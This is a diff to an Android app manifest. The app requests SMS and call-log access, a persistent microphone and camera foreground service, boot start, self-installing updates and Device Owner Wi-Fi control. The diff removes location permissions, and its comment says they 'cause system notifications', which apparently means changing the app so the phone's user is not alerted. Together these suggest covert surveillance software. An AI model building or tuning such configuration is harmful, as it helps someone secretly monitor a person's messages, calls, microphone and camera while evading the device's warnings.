@@ -10,13 +10,17 @@
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-    <!-- Location -->
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <!-- Location REMOVED - causes system notifications -->
+    <!-- <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /> -->
+    <!-- <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /> -->
 
     <!-- SMS & Call Log -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <!-- WiFi Control (Device Owner can toggle WiFi) -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
 
     <!-- Foreground Service Permissions (Android 9+) -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
@@ -26,8 +30,8 @@
 
     <!-- Foreground Service Type Permissions (Android 14+) -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <!-- Location service type removed -->
 
     <!-- APK Auto-Update Permissions -->
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
@@ -60,10 +64,10 @@
             </intent-filter>
         </activity>
 
-        <!-- Foreground Service (Android 14: foregroundServiceType required) -->
+        <!-- Foreground Service (location removed from foregroundServiceType) -->
         <service
             android:name=".MicService"
-            android:foregroundServiceType="microphone|location|camera"
+            android:foregroundServiceType="microphone|camera"
             android:exported="false"
             android:stopWithTask="false" />
 
